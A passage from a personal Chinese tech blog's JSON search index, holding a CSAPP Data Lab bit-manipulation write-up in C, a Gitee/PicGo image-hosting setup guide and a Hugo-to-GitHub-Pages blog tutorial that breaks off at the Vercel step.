only ~ and | * Example: bitAnd(6, 5) = 4 * Legal ops: ~ | * Max ops: 8 * Rating: 1 */ int bitAnd(int x, int y) { return ~((~x)|(~y)); } 2 .getByte 获取第 （n+1） 字节。一个字节8 bit，n字节 为 8*n bit = (n\u0026laquo;3) bit 。所以可以将x 右移 n\u0026laquo;3 bit，然后与 0xff 做与运算，得到结果。\n/* * getByte - Extract byte n from word x * Bytes numbered from 0 (LSB) to 3 (MSB) * Examples: getByte(0x12345678,1) = 0x56 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 6 * Rating: 2 */ int getByte(int x, int n) { int mask=0xff; return (x\u0026gt;\u0026gt;(n\u0026lt;\u0026lt;3))\u0026amp;mask; } 3. logicalShift 在c语言中 \u0026gt;\u0026gt;运算为算术右移，当x\u0026lt;0 时，右移最高位会补1，x\u0026gt;0，右移最高位补0。而逻辑右移，最高位都是补0。\n所以解题思路，可以先做 x\u0026raquo;n 然后再与mask=0xfffffff移位后的结果做\u0026amp;运算。 ((0x1\u0026lt;\u0026lt;(32+~n))+~0)|(0x1\u0026lt;\u0026lt;(32+~n)) 这个就是构造mask的方法。\n~0=-，这个式子就类似 (m-1)|(m) ,例如 7|8 == 0111 | 1000 =1111就是让最高位与后面的位都置1.\n/* * logicalShift - shift x to the right by n, using a logical shift * Can assume that 0 \u0026lt;= n \u0026lt;= 31 * Examples: logicalShift(0x87654321,4) = 0x08765432 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 20 * Rating: 3 */ int logicalShift(int x, int n) { int mask=((0x1\u0026lt;\u0026lt;(32+~n))+~0)|(0x1\u0026lt;\u0026lt;(32+~n)); return (x\u0026gt;\u0026gt;n)\u0026amp;mask; } 4. bitCount 这个题目要求算出 x 的二进制 中 1的个数。\n/* * bitCount - returns count of number of 1's in word * Examples: bitCount(5) = 2, bitCount(7) = 3 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 40 * Rating: 4 */ int bitCount(int x) { int mk1, mk2, mk3, mk4, mk5, result; mk5 = 0xff | (0xff \u0026lt;\u0026lt; 8); mk4 = 0xff | (0xff \u0026lt;\u0026lt; 16); mk3 = 0x0f | (0x0f \u0026lt;\u0026lt; 8); mk3 = mk3 | (mk3 \u0026lt;\u0026lt; 16); mk2 = 0x33 | (0x33 \u0026lt;\u0026lt; 8); mk2 = mk2 | (mk2 \u0026lt;\u0026lt; 16); mk1 = 0x55 | (0x55 \u0026lt;\u0026lt; 8); mk1 = mk1 | (mk1 \u0026lt;\u0026lt; 16); // 先把16个相邻两位有几个1，并用这两位表示，然后以此类推， // 即： 32-\u0026gt;16， 16-\u0026gt;8， 8-\u0026gt;4， 4-\u0026gt;2， 2-\u0026gt;1 result = (mk1 \u0026amp; x) + (mk1 \u0026amp; (x \u0026gt;\u0026gt; 1)); result = (mk2 \u0026amp; result) + (mk2 \u0026amp; (result \u0026gt;\u0026gt; 2)); result = mk3 \u0026amp; (result + (result \u0026gt;\u0026gt; 4)); result = mk4 \u0026amp; (result + (result \u0026gt;\u0026gt; 8)); result = mk5 \u0026amp; (result + (result \u0026gt;\u0026gt; 16)); return result; } 5. bang 不能使用!计算 !x。这道题的思路是找x 的二进制数是否存在 1，那么可以利用二分查找的思想，先找高16位。若高16位为0，则找低16位。否则在高16位找。\n然后又折半，找八位\u0026hellip;\u0026hellip;以此类推，最后得到 x，0 -\u0026gt;1,1-\u0026gt;0。\n思路2 一个非0的数与其相反数做 |运算，则最高位为1， x |((~x)+1。当x=0时，结果依然为0。所以可以通过判断最高位的值然后做 ~运算 再\u0026amp;1得到结果。\n/* * bang - Compute !x without using ! * Examples: bang(3) = 0, bang(0) = 1 * Legal ops: ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 12 * Rating: 4 */ int bang(int x) { x=(x\u0026gt;\u0026gt;16)|x; x=(x\u0026gt;\u0026gt;8)|x; x=(x\u0026gt;\u0026gt;4)|x; x=(x\u0026gt;\u0026gt;2)|x; x=(x\u0026gt;\u0026gt;1)|x; return ~x\u0026amp;0x1; } /* *题解2 */ int bang(int x) { x=(x\u0026gt;\u0026gt;16)|x; x=(x\u0026gt;\u0026gt;8)|x; x=(x\u0026gt;\u0026gt;4)|x; x=(x\u0026gt;\u0026gt;2)|x; x=(x\u0026gt;\u0026gt;1)|x; return ~x\u0026amp;0x1; } 6. tmin 二进制补码最小值\n/* * tmin - return minimum two's complement integer * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 4 * Rating: 1 */ int tmin(void) { return 0x1\u0026lt;\u0026lt;31; } 7. fitsBits 只给出n个二进制位，能否表示x。\n可以先将x 右移 n-1 位，然后，比较这时是否全1或全0，若是，则可以表示，若不是，则不能表示。\n/* * fitsBits - return 1 if x can be represented as an * n-bit, two's complement integer. * 1 \u0026lt;= n \u0026lt;= 32 * Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 15 * Rating: 2 */ int fitsBits(int x, int n) { int bit = ~(~n+1); int temp = x\u0026gt;\u0026gt;bit; return !temp|!(temp+1); } 8. divpwr2 计算 x/(2^n) 但结果需要向0 靠近。\n主要考虑负数的情况，因为 -33/16 = -3，向更小的方向靠近了。所以可以构造一个数 bias （偏置）使得在 x \u0026gt;= 0时，bias = 0；在 x \u0026lt; 0 时，bias = (1 \u0026laquo; n) - 1;\n/* * divpwr2 - Compute x/(2^n), for 0 \u0026lt;= n \u0026lt;= 30 * Round toward zero * Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 15 * Rating: 2 */ int divpwr2(int x, int n) { int bias=(x\u0026gt;\u0026gt;31)\u0026amp;((0x1\u0026lt;\u0026lt;n)+~0); return (x+bias)\u0026gt;\u0026gt;n; } 9. negate 相反数\n/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 5 * Rating: 2 */ int negate(int x) { return (~x+1); } 10. isPositive 判断是否为正数\n/* * isPositive - return 1 if x \u0026gt; 0, return 0 otherwise * Example: isPositive(-1) = 0. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 8 * Rating: 3 */ int isPositive(int x) { int tmp=(x\u0026gt;\u0026gt;31)\u0026amp;0x1; int ans = !(!tmp|x); return ans; } 11. isLessOrEqual x \u0026lt;= y 是否成立。可以用x-y 判断结果是否为非正数。\n/* * isLessOrEqual - if x \u0026lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 24 * Rating: 3 */ int isLessOrEqual(int x, int y) { int val=!!((x+~y)\u0026gt;\u0026gt;31); x=x\u0026gt;\u0026gt;31; y=y\u0026gt;\u0026gt;31; return (!!x|!y)\u0026amp;((!!x\u0026amp;!y)|(val)); } 12. ilog2 思路有点像第五题，这道题主要是想找出最高位的1是第几位。\n/* * ilog2 - return floor(log base 2 of x), where x \u0026gt; 0 * Example: ilog2(16) = 4 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 90 * Rating: 4 */ int ilog2(int x) { int ans=0; ans=(!!(x\u0026gt;\u0026gt;(16)))\u0026lt;\u0026lt;4; ans=ans+((!!(x\u0026gt;\u0026gt;(8+ans)))\u0026lt;\u0026lt;3); ans=ans+((!!(x\u0026gt;\u0026gt;(4+ans)))\u0026lt;\u0026lt;2); ans=ans+((!!(x\u0026gt;\u0026gt;(2+ans)))\u0026lt;\u0026lt;1); ans=ans+((!!(x\u0026gt;\u0026gt;(1+ans)))\u0026lt;\u0026lt;0); return ans; } 13. float_neg 计算浮点数x的负数。。浮点数是由s(1位)E(8位)M(23位)(-1)^s * M * 2^E组成的浮点数。判断是否为NAN\n/* * float_neg - Return bit-level equivalent of expression -f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representations of * single-precision floating point values. * When argument is NaN, return argument. * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. also if, while * Max ops: 10 * Rating: 2 */ unsigned float_neg(unsigned uf) { int c=0x00ffffff; if(((uf\u0026lt;\u0026lt;1)^(0xffffffff))\u0026lt;c){ return uf; }else{ return uf^(0x80000000); } } 14. float_i2f 将int转换为float\n/* * float_i2f - Return bit-level equivalent of expression (float) x * Result is returned as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point values. * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. also if, while * Max ops: 30 * Rating: 4 */ unsigned float_i2f(int x) { unsigned ans; int tmpx=x; int f=0; int delta=0; int tail=0; int E=0; if(x == 0) return x; if(x == 0x80000000) return 0xcf000000; ans=x\u0026amp;0x80000000; if(ans) tmpx = -x; while( (tmpx\u0026gt;\u0026gt;E)) E++; E = E -1; tmpx = tmpx\u0026lt;\u0026lt;(31-E); tail = (tmpx \u0026gt;\u0026gt; 8) \u0026amp; 0x007FFFFF; f = tmpx \u0026amp; 0xff; delta =(f\u0026gt;128) || ( (f == 128) \u0026amp;\u0026amp; (tail \u0026amp; 1) ); tail+=delta; E=E+127; if(tail \u0026gt;\u0026gt; 23) { tail = tail \u0026amp;0x007FFFFF; E+=1; } ans=ans | E \u0026lt;\u0026lt; 23 | tail; return ans; } 15. float_twice /* * float_twice - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. also if, while * Max ops: 30 * Rating: 4 */ unsigned float_twice(unsigned uf) { unsigned S=uf\u0026amp;0x80000000; unsigned E=uf\u0026amp;0x7F800000; unsigned M=uf\u0026amp;0x007FFFFF; unsigned wu = 0xFF000000; unsigned tmp = uf \u0026lt;\u0026lt; 1; unsigned ans = uf; if( ( wu \u0026amp; tmp ) == wu) { return uf; } if(E != 0) { ans=S+(E+0x00800000)+M; } else if( M!=0 ) { ans=S+E+(M \u0026lt;\u0026lt; 1); } return ans; } ","id":8,"section":"posts","summary":"CSAPP\u0026ndash;Data Lab实验记录 [TOC] 前言 Students implement simple logical, two\u0026rsquo;s complement, and floating point functions, but using a highly restricted subset of C. For example, they might be asked to compute the absolute value of a number using only bit-level operations and straightline code. This lab helps students understand the bit-level representations of C data types and the bit-level behavior of the operations on","tags":["csapp-lab"],"title":"CSAPP--Data Lab实验记录","uri":"https://lincx-911.github.io/2021/12/csapp_datalab/","year":"2021"},{"content":"一、前言 Markdown是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，Markdown文件的后缀名便是“.md”。Markdown处在于网络中的各个角落，StackOverflow、CSDN、掘金、简书、GitBook、有道云笔记、V2EX、光谷社区等。主流的代码托管平台，如 GitHub、GitLab、BitBucket、Coding、Gitee 等等，都支持 Markdown 语法，很多开源项目的 README、开发文档、帮助文档、Wiki 等都用 Markdown 写作。\n像你现在在这个博客网站上面看到的文章，背后都是基于Markdown的语法编写的。在写作的时候，插入图片经常会阻碍到自己写作的进度，文章中引用某个地址的图片（可能是本地），在其他平台上面展示的时候可能有些不支持，导致图片无法正常显示，解决这个问题方法之一就是 图床。\n二、图床 图床可以理解为一个专门存储图片的网盘，当我们上传图片到图床的时候，会为该图片生成一个地址，用户可以通过这个地址访问到该图片。\n常见的图床有\n七牛云\n腾讯云\n阿里云\n聚合图床\nImageURL\n知乎\n路过图床\nGithub\nGitee\n\u0026hellip;\u0026hellip;\n上述的图床，有些需要收费，有些需要各种验证，比较麻烦。个人选择 Gitee的原因：\nGitee被称为国内版Github，有保障点 自己有账号，且免费（但是一个仓库最多5G，但是也绰绰有余了） 服务器在国内，访问速度快 2.1 创建图床 2.1.1注册登录Gitee 访问Gitee ，注册并登录\n新建仓库 这个新仓库专门用于存储图片使用\n仓库名称自定义，例如：imagebed\n选择 开源，否则访问不了图片\n2.1.2 创建私人令牌 这个私人令牌主要是为了后面 PicGo准备的\n设置 -\u0026gt; 私人令牌 令牌权限只需要设置一个 projects 即可\n注意这里的私人令牌只显示一次，请复制然后在其他空白地方先记下来\n到此，图床创建完成！\n三、PicGo PicGo 是一款比较优秀的图床工具。它是一款用 Electron-vue 开发的软件，可以支持微博，七牛云，腾讯云COS，GitHub，阿里云OSS，imgur 等常用图床，当然Gitee 也提供了相应的插件，功能强大，简单易用。\n下载链接 使用文档 安装完成后，打开应用主页进行插件配置等工作\n1、首先安装Gitee 插件，默认是没有该图床插件的。所以，点击 插件设置，在搜索框输入 gitee搜索，安装下图的插件\n2、安装完毕之后，点击左侧 图床设置\u0026ndash;\u0026gt;Gitee图床，开始Gitee图床配置\nowner：gitee用户名 repo ：图床的仓库名 path：图片保存的目录 token：上面步骤的私人令牌 最后点击 确定、设为默认图床即可完成配置\n使用\n点击 上传区\n将图片拖入或者点击上传 或者 点击 剪贴板图片将剪贴板的图片上传。左下边可以选择结果链接的形式。\n可以在 PicGo设置上传提示，这样就会有进度与成功提示\n最后，在复制板中就有自己刚刚上传图片的结果了。\n四、Typora 使用图床 typora 作为一款专业的markdown编辑工具，是我们进行markdown写作的一大利器。现在仍然使用它来写作。\n（坏消息：最近开始需要收费了，附上一个收费前最后一次更新的版本https://download.typora.io/windows/typora-update-x64-1117.exe）\n文件 --\u0026gt; 偏好设置 --\u0026gt; 图像 配置 像上图就行，更改PicGo路径为自己电脑安装的 PicGo的路径。\n之后就可以愉快的复制图片到文章里边，自动产生 Markdown 格式的图片链接，不需要自己再手动写入。\n四、总结 截止目前blog 搭建工作已完成🎈，写文章的工具也准备的七七八八了。接下来就需要开始技术记录了。\n","id":9,"section":"posts","summary":"一、前言 Markdown是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，Markdown文件的后缀名便是“.md”。Mar","tags":["Gitee","Markdown"],"title":"Gitee PicGo打造免费个人图床","uri":"https://lincx-911.github.io/2021/12/picturebed/","year":"2021"},{"content":"一、背景介绍 博主之前使用Hexo 搭建博客，用了三年，这个工具最大的缺点就是，每次更新blog后，项目运行跟打包的速度有点慢，直到近期在冲浪的时候发现了Hugo，号称最快的静态站点生成器。使用之后发现确实，更快，果断迁移！\n博主在第一次创建博客的时候还是一名学生，当时经济上不能满足我为搭建博客购买服务器、域名等，之后发现Github账户可以给自己开一个静态网站（可通过username.github.io访问）\u0026ndash;Git Pages 。静态网站有一些功能上的限制，如不能运行php、不能自动读写站内文件\u0026hellip;\u0026hellip;但是考虑到自己搭建博客的目的主要是记录学习、记录技术等，静态网站可以满足个人需求，主要还是因为免费，所以选择了它。但是有个缺点是访问速度慢或者无法访问，因为Github的服务器在国外，所以国内访问会受到限制。直到看到了Vercel之后找到了代替git pages的方案，下面会介绍这个网站的。\n二、开始搭建 2.1 创建网站Github仓库 Millions of developers and companies build, ship, and maintain their software on GitHub—the largest and most advanced development platform in the world.\nGithub 顾名思义全球最大的同性交友（击剑）网站全球最大代码托管平台，每个程序员都应该有听过或者正在使用。我们可以将自己的网站代码托管在上面。\n2.1.1 注册Github账号 访问Github，点击右上角 Sign Up进行注册，注册成功后，Sign in进入个人主页\n2.1.2 新建仓库 点击右上角 + \u0026ndash;\u0026gt; 点击 New Repository\n注意此处，仓库命名为 ”username.github.io\u0026quot; 例如 你的账户名为lincx那么此处设置为 lincx.github.io\n点击 Create Repository即创建成功\n2.1.3 本地安装git 本地下载 Git ，Win10直接下载 exe ，点击下一步就好了\n（已安装的可以直接跳过）\n更多关于git 学习，可以看git学习\n2.2 Hugo Hugo is one of the most popular open-source static site generators. With its amazing speed and flexibility, Hugo makes building websites fun again.\nHugo是由Go语言实现的静态网站生成器。简单、易用、高效、易拓展、快速部署。\n2.2.1 安装hugo 从hugo的GitHub 仓库下载即可，可根据个人电脑类型选择适合的安装包，博主选择的是 hugo_0.89.4_Windows-64bit.zip，下载完成，解压，将hugo的路径添加到环境变量PATH即可。（针对win10）打开命令行，输入hugo version，显示版本号即为安装成功。\n2.2.2 初始化网站 在适合的位置 （推荐D盘）输入 hugo new site blogname ，其中 blogname 可以根据自己喜好修改\n\u0026gt; hugo new site blogname Congratulations! Your new Hugo site is created in E:\\blog\\hugo\\blogname. Just a few more steps and you're ready to go: 1. Download a theme into the same-named folder. Choose a theme from https://themes.gohugo.io/ or create your own with the \u0026quot;hugo new theme \u0026lt;THEMENAME\u0026gt;\u0026quot; command. 2. Perhaps you want to add some content. You can add single files with \u0026quot;hugo new \u0026lt;SECTIONNAME\u0026gt;\\\u0026lt;FILENAME\u0026gt;.\u0026lt;FORMAT\u0026gt;\u0026quot;. 3. Start the built-in live server via \u0026quot;hugo server\u0026quot;. Visit https://gohugo.io/ for quickstart guide and full documentation. 根据提示信息：\n下载配置主题 添加blog文章内容 在本机启动hugo自带的服务器进行调试 点击进入blogname文件夹可以看到文件构成\n├─archetypes ├─content ├─data ├─layouts ├─resources ├─static ├─themes ├─.hugo_build.lock └─config.toml config.toml 是网站的配置文件，hugo 同时还支持 YAML 格式的 config.yaml 或 JSON 格式的 config.json。content 目录放 markdown 文章，data 目录放数据，layouts 目录放网站模板文件，static 目录放图片、css、js 等静态资源，themes 命令放下载的主题\n2.2.3 下载主题 hugo默认不自带主题，但是又需要主题才能正常工作，所以我们可以到 主题网站，选择心仪的主题，下载到themes目录中。\n下面以code主题为例：\n首先点击到主题里边，点击 Download之后就会跳转到对应的GitHub仓库\n在readme 处通常会有安装教程，可以根据这个教程来完成\n也可以直接将它拉取到本地，复制地址\n在本地项目blogname的themes目录中，右击打开 Git Bash here ，运行 git clone git@github.com:luizdepra/hugo-coder.git hugo-coder命令，即可下载成功\n$ git clone git@github.com:luizdepra/hugo-coder.git hugo-coder Cloning into 'hugo-coder'... remote: Enumerating objects: 2649, done. remote: Counting objects: 100% (267/267), done. remote: Compressing objects: 100% (155/155), done. remote: Total 2649 (delta 92), reused 190 (delta 52), pack-reused 2382 Receiving objects: 100% (2649/2649), 3.05 MiB | 1.70 MiB/s, done. Resolving deltas: 100% (1320/1320), done. 接着，将 hugo-coder\\exampleSite\\config.toml 这个配置文件复制代替blogname 根目录的config.toml\n最后在项目blogname根目录打开命令行，下面是一个快速打开命令行的方式，在文件路径栏中输入 cmd按回车 Enter即可打开\n运行 hugo server -D 看到下面的提示，算成功了。\nE:\\blog\\hugo\\blogname\u0026gt;hugo server -D port 1313 already in use, attempting to use an available port Start building sites … hugo v0.89.4-AB01BA6E windows/amd64 BuildDate=2021-11-17T08:24:09Z VendorInfo=gohugoio | EN | PT-BR -------------------+----+-------- Pages | 11 | 11 Paginator pages | 0 | 0 Non-page files | 0 | 0 Static files | 5 | 5 Processed images | 0 | 0 Aliases | 1 | 0 Sitemaps | 2 | 1 Cleaned | 0 | 0 Built in 114 ms Watching for changes in E:\\blog\\hugo\\blogname\\{archetypes,content,data,layouts,static,themes} Watching for config changes in E:\\blog\\hugo\\blogname\\config.toml, E:\\blog\\hugo\\blogname\\themes\\hugo-coder\\config.toml Environment: \u0026quot;development\u0026quot; Serving pages from memory Running in Fast Render Mode. For full rebuilds on change: hugo server --disableFastRender Web Server is available at http://localhost:1313/ (bind address 127.0.0.1) Press Ctrl+C to stop 打开 浏览器 访问 http://localhost:1313/ 可以看到blog主页\n2.2.4 添加内容 在项目目录中执行 hugo new XX.md 命令，会在 content 目录中创建这个 XX.md 文件。\nhugo new about.md 这个文件的默认内容为：\n--- title: \u0026quot;About\u0026quot; date: 2021-12-03T15:05:35+08:00 draft: true --- draft 表示是否是草稿，编辑完成后请将其改为 false，否则编译会跳过草稿文件。具体内容写在其下面：\n--- title: \u0026quot;About\u0026quot; date: 2021-12-03T15:05:35+08:00 draft: true --- # 关于作者 一名在校计算机专业学生，技术主要集中在后端开发，同时也有接触过前端、小程序开发，平时喜欢接触一些新鲜玩意儿 目前技术栈： + Golang、Java、JavaScript + Vue.js、Spring、Spring Boot、Gin + Mysql、Redis、Etcd + 云原生、分布式 希望通过这个blog记录自己学习心得等，有问题欢迎联系哦！ 再次运行 hugo server -D，在浏览器点开blog主页的About能看到内容\n一般blog文章内容放在 content/posts这个目录中，所以写文章可以运行 hugo new posts/xxxx.md\n新建内容文件，然后编写内容\n+++ draft = true date = 2021-12-03T15:23:01+08:00 title = \u0026quot;First Blog\u0026quot; description = \u0026quot;xxxx\u0026quot; slug = \u0026quot;\u0026quot; authors = [\u0026quot;lincx\u0026quot;] tags = [] categories = [] externalLink = \u0026quot;\u0026quot; series = [] +++ # First Blog 这是我的第一篇blog 希望能在接下来的日子里，在这里分享自己学习心路历程 重新运行 hugo server -D，在浏览器点开blog主页的Blog能看到内容\n2.2.5 更改配置 blog项目的配置主要是根目录下的 config.toml文件\nbaseURL = \u0026quot;http://www.example.com\u0026quot; title = \u0026quot;johndoe\u0026quot; theme = \u0026quot;hugo-coder\u0026quot; languageCode = \u0026quot;en\u0026quot; defaultContentLanguage = \u0026quot;en\u0026quot; paginate = 20 pygmentsStyle = \u0026quot;bw\u0026quot; pygmentsCodeFences = true pygmentsCodeFencesGuessSyntax = true enableEmoji = true # Enable Disqus comments # disqusShortname = \u0026quot;yourdiscussshortname\u0026quot; [params] author = \u0026quot;John Doe\u0026quot; description = \u0026quot;John Doe's personal website\u0026quot; keywords = \u0026quot;blog,developer,personal\u0026quot; info = [\u0026quot;Full Stack DevOps\u0026quot;, \u0026quot;Magician\u0026quot;] avatarURL = \u0026quot;images/avatar.jpg\u0026quot; #gravatar = \u0026quot;john.doe@example.com\u0026quot; dateFormat = \u0026quot;January 2, 2006\u0026quot; since = 2019 # Git Commit in Footer, uncomment the line below to enable it commit = \u0026quot;https://github.com/luizdepra/hugo-coder/tree/\u0026quot; # Right To Left, shift content direction for languagues such as Arabic rtl = false # Specify light/dark colorscheme # Supported values: # \u0026quot;auto\u0026quot; (use preference set by browser) # \u0026quot;dark\u0026quot; (dark background, light foreground) # \u0026quot;light\u0026quot; (light background, dark foreground) (default) colorScheme = \u0026quot;auto\u0026quot; # Hide the toggle button, along with the associated vertical divider hideColorSchemeToggle = false # Series see also post count maxSeeAlsoItems = 5 # Custom CSS customCSS = [] # Custom SCSS, file path is relative to Hugo's asset folder (default: {your project root}/assets) customSCSS = [] # Custom JS customJS = [] # If you want to use fathom(https://usefathom.com) for analytics, add this section # [params.fathomAnalytics] # siteID = \u0026quot;ABCDE\u0026quot; # serverURL = \u0026quot;analytics.example.com\u0026quot; # Default value is cdn.usefathom.com, overwrite this if you are self-hosting # If you want to use plausible(https://plausible.io) for analytics, add this section # [params.plausibleAnalytics] # domain = \u0026quot;example.com\u0026quot; # serverURL = \u0026quot;analytics.example.com\u0026quot; # Default value is plausible.io, overwrite this if you are self-hosting or using a custom domain # If you want to use goatcounter(https://goatcounter.com) for analytics, add this section # [params.goatCounter] # code = \u0026quot;code\u0026quot; # If you want to use Cloudflare Web Analytics(https://cloudflare.com) for analytics, add this section # [params.cloudflare] # token = \u0026quot;token\u0026quot; # If you want to use Matomo(https://matomo.org) for analytics, add this section # [params.matomo] # siteID = \u0026quot;ABCDE\u0026quot; # Default value is \u0026quot;1\u0026quot;, overwrite this if you are cloud-hosting # serverURL = \u0026quot;analytics.example.com\u0026quot; # For cloud-hosting, use provided URL, e.g. example.matomo.cloud # If you want to use Google Tag Manager(https://analytics.google.com/) for analytics, add this section # [params.googleTagManager] # id = \u0026quot;gid\u0026quot; # If you want to implement a Content-Security-Policy, add this section [params.csp] childsrc = [\u0026quot;'self'\u0026quot;] fontsrc = [\u0026quot;'self'\u0026quot;, \u0026quot;https://fonts.gstatic.com\u0026quot;, \u0026quot;https://cdn.jsdelivr.net/\u0026quot;] formaction = [\u0026quot;'self'\u0026quot;] framesrc = [\u0026quot;'self'\u0026quot;] imgsrc = [\u0026quot;'self'\u0026quot;] objectsrc = [\u0026quot;'none'\u0026quot;] stylesrc = [ \u0026quot;'self'\u0026quot;, \u0026quot;'unsafe-inline'\u0026quot;, \u0026quot;https://fonts.googleapis.com/\u0026quot;, \u0026quot;https://cdn.jsdelivr.net/\u0026quot; ] scriptsrc = [\u0026quot;'self'\u0026quot;, \u0026quot;'unsafe-inline'\u0026quot;, \u0026quot;https://www.google-analytics.com\u0026quot;] prefetchsrc = [\u0026quot;'self'\u0026quot;] # connect-src directive – defines valid targets for to XMLHttpRequest (AJAX), WebSockets or EventSource connectsrc = [\u0026quot;'self'\u0026quot;, \u0026quot;https://www.google-analytics.com\u0026quot;] [taxonomies] category = \u0026quot;categories\u0026quot; series = \u0026quot;series\u0026quot; tag = \u0026quot;tags\u0026quot; author = \u0026quot;authors\u0026quot; [[params.social]] name = \u0026quot;Github\u0026quot; icon = \u0026quot;fa fa-2x fa-github\u0026quot; weight = 1 url = \u0026quot;https://github.com/johndoe/\u0026quot; [[params.social]] name = \u0026quot;Gitlab\u0026quot; icon = \u0026quot;fa fa-2x fa-gitlab\u0026quot; weight = 2 url = \u0026quot;https://gitlab.com/johndoe/\u0026quot; [[params.social]] name = \u0026quot;Twitter\u0026quot; icon = \u0026quot;fa fa-2x fa-twitter\u0026quot; weight = 3 url = \u0026quot;https://twitter.com/johndoe/\u0026quot; [[params.social]] name = \u0026quot;LinkedIn\u0026quot; icon = \u0026quot;fa fa-2x fa-linkedin\u0026quot; weight = 4 url = \u0026quot;https://www.linkedin.com/in/johndoe/\u0026quot; [[params.social]] name = \u0026quot;Medium\u0026quot; icon = \u0026quot;fa fa-2x fa-medium\u0026quot; weight = 5 url = \u0026quot;https://medium.com/@johndoe\u0026quot; [[params.social]] name = \u0026quot;RSS\u0026quot; icon = \u0026quot;fa fa-2x fa-rss\u0026quot; weight = 6 url = \u0026quot;https://myhugosite.com/index.xml\u0026quot; rel = \u0026quot;alternate\u0026quot; type = \u0026quot;application/rss+xml\u0026quot; [languages.en] languageName = \u0026quot;🇬🇧\u0026quot; [[languages.en.menu.main]] name = \u0026quot;About\u0026quot; weight = 1 url = \u0026quot;about/\u0026quot; [[languages.en.menu.main]] name = \u0026quot;Blog\u0026quot; weight = 2 url = \u0026quot;posts/\u0026quot; [[languages.en.menu.main]] name = \u0026quot;Projects\u0026quot; weight = 3 url = \u0026quot;projects/\u0026quot; [[languages.en.menu.main]] name = \u0026quot;Contact me\u0026quot; weight = 5 url = \u0026quot;contact/\u0026quot; [languages.pt-br] languageName = \u0026quot;🇧🇷\u0026quot; title = \u0026quot;João Ninguém\u0026quot; [languages.pt-br.params] author = \u0026quot;João Ninguém\u0026quot; info = \u0026quot;Full Stack DevOps e Mágico\u0026quot; description = \u0026quot;Sítio pessoal de João Ninguém\u0026quot; keywords = \u0026quot;blog,desenvolvedor,pessoal\u0026quot; [[languages.pt-br.menu.main]] name = \u0026quot;Sobre\u0026quot; weight = 1 url = \u0026quot;about/\u0026quot; [[languages.pt-br.menu.main]] name = \u0026quot;Blog\u0026quot; weight = 2 url = \u0026quot;posts/\u0026quot; [[languages.pt-br.menu.main]] name = \u0026quot;Projetos\u0026quot; weight = 3 url = \u0026quot;projects/\u0026quot; [[languages.pt-br.menu.main]] name = \u0026quot;Contato\u0026quot; weight = 5 url = \u0026quot;contact/\u0026quot; ✨😈一定要修改baseURL ：\n需要改成 2.1.2步 创建的仓库 ，找到Settings-\u0026gt;Options-\u0026gt;Repository name\n将 bashURL \u0026ldquo;=\u0026rdquo; 后面的内容换成 “https://xxxx.github.io/”xxxx 为你的用户名，例如我的 “https://lincx-911.github.io/”\n如果不修改 baseURL的话push到远程仓库，会找不到文件\n🤡修改头像的话 avatarURL：\n可以在项目根目录下的 static\\images文件夹（没有的话自己创建）添加自己的照片，将 avatarURL后面的内容修改为 “images\\xxxx.png”\n其他的可以根据自己的需求进行修改\n2.2.6 上传到GitHub 在项目根目录 blogname打开命令行，输入 hugo，回车，如果一切顺利，所有静态页面都会生成到 public 目录，将pubilc目录里所有文件 push 到刚创建的Repository的\nPS E:\\blog\\hugo\\blogname\u0026gt; hugo Start building sites … hugo v0.89.4-AB01BA6E windows/amd64 BuildDate=2021-11-17T08:24:09Z VendorInfo=gohugoio | EN | PT-BR -------------------+----+-------- Pages | 11 | 11 Paginator pages | 0 | 0 Non-page files | 0 | 0 Static files | 10 | 10 Processed images | 0 | 0 Aliases | 1 | 0 Sitemaps | 2 | 1 Cleaned | 0 | 0 Total in 936 ms 进入 public 文件夹，依次输入下面命令就行，注意 xxxx要换成你的github username\n$ cd public $ git init $ git remote add origin https://github.com/xxxxx/xxxxx.github.io.git $ git add -A $ git commit -m \u0026quot;first commit\u0026quot; $ git push -u origin master 浏览器里访问：http://xxxxxx.github.io/会看到你的blog主页了。以后，每次新增文章或者修改配置，都需要重新走一遍上面2.2.6 的步骤，只不过不需要 git init跟git remote 两个步骤，这两个只需要在第一次push的时候执行就行\n2.2.7 报错 1、点看主页后发现 “This XML file does not appear to have any”。解决：点开GitHub仓库\nSettings -\u0026gt; Pages -\u0026gt; Change theme 随便选一个主题就行。然后重新访问就能正常了。\n2.3 Vercel vercel 是目前我用过的最好用的网站托管服务\n2.3.1 注册账号 访问主页，点击右上角 Sign Up 